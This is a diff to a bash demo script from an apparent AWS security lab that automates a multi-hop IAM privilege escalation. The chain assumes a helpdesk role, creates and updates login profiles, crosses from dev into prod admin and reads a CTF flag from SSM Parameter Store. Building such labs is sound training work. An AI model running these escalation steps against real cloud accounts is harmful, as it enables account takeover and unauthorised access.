@@ -61,6 +61,15 @@ if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
     exit 1
 fi
 
+# Retrieve prod admin cleanup credentials for flag capture (Jeremy's admin equivalent)
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
+if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find prod admin credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 cd - > /dev/null
 
@@ -68,6 +77,13 @@ cd - > /dev/null
 use_readonly_creds() {
     export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_jeremy_admin_creds() {
+    # pl-Jeremy is an admin in prod; represented here by the prod admin cleanup user
+    # since Jeremy only has console access in this scenario
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -84,9 +100,6 @@ use_starting_creds() {
     unset AWS_SECRET_ACCESS_KEY
     unset AWS_SESSION_TOKEN
 }
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
 echo ""
@@ -229,6 +242,26 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 unset AWS_SECRET_ACCESS_KEY
                 unset AWS_SESSION_TOKEN
 
+                # [EXPLOIT] Step 8: Capture the CTF flag from SSM Parameter Store
+                # pl-Jeremy holds full admin in prod. For this automated demo, the flag is
+                # read using equivalent admin credentials since Jeremy only has console access.
+                use_jeremy_admin_creds
+                echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
+                FLAG_PARAM_NAME="/pathfinding-labs/flags/multi-hop-both-sides-to-admin"
+                show_attack_cmd "Attacker (Jeremy/prod admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+                FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+                if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+                    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+                else
+                    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+                    exit 1
+                fi
+                echo ""
+
+                # Restore helpful permissions for manual exploration
+                restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
                 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
                     echo -e "\n${YELLOW}Attack Commands:${NC}"
                     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -237,12 +270,24 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 fi
 
                 echo ""
-                echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
+                echo -e "${GREEN}========================================${NC}"
+                echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
+                echo -e "${GREEN}========================================${NC}"
+                echo -e "\n${YELLOW}Attack Summary:${NC}"
                 echo "The attack successfully demonstrated multi-hop privilege escalation:"
                 echo "1. Dev user assumed helpdesk role and created login profile for Josh"
                 echo "2. Josh (admin in dev) assumed trustsdev role in prod"
                 echo "3. Trustsdev role updated Jeremy's login profile in prod"
                 echo "4. Jeremy now has admin access in prod account"
+                echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+                echo ""
+
+                echo -e "\n${YELLOW}Attack Path:${NC}"
+                echo -e "  pl-pathfinding-starting-user-dev → (sts:AssumeRole) → pl-helpdesk"
+                echo -e "  → (iam:CreateLoginProfile) → pl-Josh (dev admin)"
+                echo -e "  → (sts:AssumeRole) → pl-trustsdev (prod)"
+                echo -e "  → (iam:UpdateLoginProfile) → pl-Jeremy (prod admin)"
+                echo -e "  → (ssm:GetParameter) → CTF Flag"
                 echo ""
 
                 # Output standardized test results
